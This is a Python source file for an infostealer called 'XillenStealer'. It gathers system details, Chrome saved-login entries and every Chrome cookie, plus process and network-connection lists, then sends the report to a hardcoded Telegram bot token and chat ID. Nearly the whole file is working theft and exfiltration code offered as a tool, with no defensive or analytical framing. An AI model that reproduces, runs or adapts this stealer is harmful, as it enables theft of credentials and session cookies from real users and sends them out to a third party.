import os
import sys
import time
import json
import socket
import platform
import getpass
import psutil
import uuid
import requests
import re
import sqlite3
import browser_cookie3
from datetime import datetime
import telebot

# Конфигурация
TG_BOT_TOKEN = "8474305805:AAH4hGzPuca6CZ2Q7-Msrb_Ip0qu-zsh8m8"
TG_CHAT_ID = "7368280792"

def log(message):
    print(f"[LOG] {message}")

def _get_ip_address():
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text.strip()
    except:
        return "Unknown"

def _collect_browser_passwords():
    passwords = []
    try:
        # Chrome passwords
        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        if os.path.exists(chrome_path):
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                if row[1] and row[2]:  # username and password exist
                    passwords.append({
                        'url': row[0],
                        'username': row[1],
                        'password': '[ENCRYPTED]' if row[2] else ''
                    })
            conn.close()
    except Exception as e:
        print(f"Error collecting passwords: {e}")
    return passwords

def _collect_browser_cookies():
    cookies = []
    try:
        # Chrome cookies
        chrome_cookies = browser_cookie3.chrome()
        for cookie in chrome_cookies:
            cookies.append({
                'name': cookie.name,
                'value': cookie.value,
                'domain': cookie.domain,
                'path': cookie.path
            })
    except Exception as e:
        print(f"Error collecting cookies: {e}")
    return cookies

def _collect_processes():
    processes = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'username': proc.info['username'],
                    'cpu_percent': proc.info['cpu_percent'],
                    'memory_percent': proc.info['memory_percent']
                })
            except:
                continue
    except Exception as e:
        print(f"Error collecting processes: {e}")
    return processes

def _collect_connections():
    connections = []
    try:
        for conn in psutil.net_connections():
            connections.append({
                'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A",
                'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                'status': conn.status,
                'pid': conn.pid
            })
    except Exception as e:
        print(f"Error collecting connections: {e}")
    return connections

def send_telegram_report(data):
    try:
        bot = telebot.TeleBot(TG_BOT_TOKEN)
        
        # Создаем отчет
        report = f"""╔══════════════════════════════════════════════════════════════╗
║                   XillenStealer Report V4.0                 ║
║                 https://github.com/BengaminButton           ║
║                   t.me/Xillen_Adapter                       ║
╚══════════════════════════════════════════════════════════════╝
Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

=== СИСТЕМНАЯ ИНФОРМАЦИЯ ===
Hostname: {data['system_info']['hostname']}
OS: {data['system_info']['os']}
Архитектура: {data['system_info']['architecture']}
Процессор: {data['system_info']['processor']}
Пользователь: {data['system_info']['user']}
CPU ядер: {data['system_info']['cpu_count']}
Память: {data['system_info']['memory_gb']} GB
IP адрес: {data['system_info']['ip_address']}
MAC адрес: {data['system_info']['mac_address']}

=== ПАРОЛИ БРАУЗЕРОВ ===
Найдено {len(data['passwords'])} паролей:
"""
        
        for i, pwd in enumerate(data['passwords'][:10], 1):
            report += f"{i}. URL: {pwd['url']}\n   Логин: {pwd['username']}\n   Пароль: {pwd['password']}\n\n"
        
        report += f"\n=== КУКИ БРАУЗЕРОВ ===\nНайдено {len(data['cookies'])} куков\n"
        
        report += f"\n=== ПРОЦЕССЫ ===\nНайдено {len(data['processes'])} процессов\n"
        
        report += f"\n=== СЕТЕВЫЕ СОЕДИНЕНИЯ ===\nНайдено {len(data['network_connections'])} соединений\n"
        
        report += "\nСоздано командой Xillen Killers (t.me/XillenKillers) | https://github.com/BengaminButton"
        
        # Отправляем отчет
        bot.send_message(TG_CHAT_ID, report)
        print("[DEBUG] Report sent successfully!")
        
    except Exception as e:
        print(f"[DEBUG] Error sending report: {e}")

def main():
    print("[DEBUG] Starting XillenStealer Test...")
    print(f"[DEBUG] Bot token: {TG_BOT_TOKEN[:10]}...")
    print(f"[DEBUG] Chat ID: {TG_CHAT_ID}")
    
    log("Collecting system information...")
    system_info = {
        'hostname': socket.gethostname(),
        'os': f"{platform.system()} {platform.release()}",
        'architecture': platform.architecture()[0],
        'processor': platform.processor(),
        'user': getpass.getuser(),
        'cpu_count': psutil.cpu_count(),
        'memory_gb': round(psutil.virtual_memory().total / (1024**3), 2),
        'ip_address': _get_ip_address(),
        'mac_address': ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    }
    
    log("Collecting browser passwords...")
    passwords = _collect_browser_passwords()
    
    log("Collecting browser cookies...")
    cookies = _collect_browser_cookies()
    
    log("Collecting processes...")
    processes = _collect_processes()
    
    log("Collecting network connections...")
    connections = _collect_connections()
    
    collected_data = {
        'system_info': system_info,
        'passwords': passwords,
        'cookies': cookies,
        'processes': processes,
        'network_connections': connections
    }
    
    log("Data collection completed! Sending to Telegram...")
    send_telegram_report(collected_data)
    log("XillenStealer completed successfully!")

if __name__ == "__main__":
    main()
